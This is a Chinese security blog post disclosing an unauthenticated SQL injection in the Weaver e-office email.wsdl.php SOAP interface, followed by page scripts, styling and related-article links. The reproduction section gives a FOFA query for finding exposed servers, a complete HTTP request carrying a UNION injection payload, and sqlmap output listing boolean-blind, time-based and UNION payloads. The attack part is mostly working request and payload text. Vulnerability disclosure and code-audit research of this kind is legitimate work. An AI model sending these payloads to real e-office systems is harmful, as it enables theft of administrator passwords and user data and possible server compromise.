---
title: "泛微e-office email.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html
asset_dir: assets/泛微e-office-email.wsdl.php-sql注入漏洞
---

# 泛微e-office email.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/3/21 18:36
* 964浏览
* [0评论](#comment)
* 44分钟阅读

深入探索

身份验证

电子邮件

Web服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office [email](#).wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-001-30739053c625.webp)](https://image.mrxn.net/408ed73fef9d4e169fc87f40dba77cc3.webp)

[webservice](#)-json/email/email.wsdl.php 的 `GetEmailSingle` 业务逻辑如下

电子邮件与即时消息

```
function GetEmailSingle( $id, $box )
{
    global $attachment_url;
    $email = authcheck( array( ) );
    $Infor = array( );
    $data = $email->getEmailById( $id, $box );
```

深入探索

安全研究报告

服务器安全服务

网络安全培训

`$id, $box` 首先带入 `getEmailById` 函数

```
public function getEmailById( $id, $box = "" )
{
  global $connection;
  $sql = " select * from email where email_id = '{$id}' ";
  $cursor = exequery( $connection, $sql );
```

`$id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/email/email.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:EmailServicewsdl#GetEmailSingle
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b6b71,0x4b6453444f4253756546476e51716974767a57664c61657a616b4e6e5065414d676c6a6473525876,0x717a706a71)#</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-002-dd2276f86521.webp)](https://image.mrxn.net/33231a961de54d7ea6b4fc27585418a9.webp)

成功在响应回显联合注入payload

编程

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 201 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' RLIKE (SELECT (CASE WHEN (6754=6754) THEN 3 ELSE 0x28 END))-- wGmX</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' AND 6981=BENCHMARK(5000000,MD5(0x4c6e4c70))-- CxQt</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>

    Type: UNION query
    Title: MySQL UNION query (NULL) - 17 columns
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:EmailServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:GetEmailSingle soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <id xsi:type="xsd:string">3' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b6b71,0x4b6453444f4253756546476e51716974767a57664c61657a616b4e6e5065414d676c6a6473525876,0x717a706a71)#</id>
         <box xsi:type="xsd:string">gero</box>
      </urn:GetEmailSingle>
   </soapenv:Body>
</soapenv:Envelope>
---
```

# 其他

burp wsdler 插件默认解析或者soap本身解析的参数是 int 类型，不妨手动更改成string类型，当后端校验不足时，说不定有意外收获！

代码安全审计

[![泛微e-office email.wsdl.php sql注入漏洞](images/img-003-ab5438226034.webp)](https://image.mrxn.net/469f7630e0b54b7da8a49d5611ad65c7.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语句](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.其他](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office email.wsdl.php sql注入漏洞](https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALV0lEQVR4AeycgXbbuA5Efff//3lfkdkrixAZKWnr+Jwnn0VHmBmADCE1iZPtP4/H49/vxL/t1Xs0eUu7z1yDeUf1K2it3p53/kzvfnOx15t/B2sgv+ru/97lBLaB/Jr240qcbdweZ76uAw/gsAd9EL3nEB6eqOe7COnlxwLJ7QfJISjf0foz3NdtA9mT9/XPncBhIJCpw4hf3SLM671b7NdzefGqXj5rOpZW0Xnz0ip6DvkY5MXyVpifIaQPjDirOwxkZrq5153AHxtI3TEVX9065K6p2opVfWkVEP/MV3pF12Bd073fyWvNiu/U9po/NpDe+M6/dwK/PRC4dvdBfBA82y6MPhhz6yE8PFGtIzw98PyKDka+163yeioqVvp3+N8eyHcWvWvWJ3AYSE18FqsWetWBB7/CXF2UF+Uhd+kZ33Xr96gH0lNNvqO6qG4uykP6mp+h9R1ndYeBzEw397oT2AYCmTp8jn1rEH/nvRvgmn7V39eB9Ae6tH3XDwzvAnQjRJeHee4e9Ykw+jsP0WGO+gu3gVRyx8+fwD9O/avYtw6Zvjwkt6+8CKMOydWvov0Lew2kZ2kVcC3vfaq2AsZ6faVV9Ly4r8b9hHiKb4KHgUDuAgj2fUJ4CKp7J5h/F+0DY//eD6LDEVdee6/0zve810PW1gfJIdh588/wMJDPzLf290/gHxin6ZKru6Hz+jue+dQh6/fcfvKrXH6PvWav1TVkzbqu0N8R4oMRq6ZCf11X9Ly4WcC8X3nvJ6RO4Y1iGwhkau4NxrzzZ3cDjPUwz6/2AT6+l3AfV7D3huxhxUN0CLqGflEe4oMRu97rzEX9hdtAKrnj509gG4jTEt0aZPrm6hB+lZ/x9hNh7CdvH3OY+0rXC/FAsLQK9breR+fNRRj7wJjbS78oD6Mf5jnw2AbyuF9vcQKHgcA4PactwqiffRS9DlLf+au5vrN1S9crFrePFa8HslfzM4T4IajfdWDku16+w0A03fgzJ7ANBDK9mlJF3w6MenkqYOQhea8vb0XnVzmkT9VUQHIYsTQDovX8bA0Y6/TbR4T4Vro+Ud8KIf3gidtAVkU3/9oT2N7t7cs6Zcj01CE5BLvPfOWXX6H1IozryK/qi4fU1HUFJIcRS5sFjD5IPvPOOIi/79VctNa88H5CPJU3wW0gNZ0KyHRX+yvPPvTJmUP6dL7rV3N9HSHrwPO3SPT0tc0H/Ld++d+KEc988FwbGIt3GTC8ywBjvrPe34fsD+MdrrcnBDI174rV5iA+CK58K97+HfXD2FcfhIeg/t9B+LwXjLp7EV17lcNYv/LLF24DqeSOnz+BbSB9yqutdR/kLoARu6/nEP/ZOhCf9R339TB691pdQ/S6rrBXXVdAdHmxtH3A6IPke09dr+pLq1CH1AP355DHm722J6TvCzI1p6gO4c3VO6p3hLFefVUvD6mD4KxOToS5F+a8dSKMPnn31HOIH0bUB+FXefHLgZR4x+tPYBsIjNPzLoA5v9oqxA9ztK8I8Z31U7fOHFIPz+9DIJxe0ZoV6oPU64PkEJRfoX3Uey4/w20gM/HmXn8C20CcIuQugKBb6rq5OsTfefWrPKSPdeJZfendC+kFwZUuv8LqvQ8Y+1mn5/F4fFA9/yBP/tgGcuK75RedwPL3slzfKUPuip5DeP2QXJ8I4bvP/AxhrJ/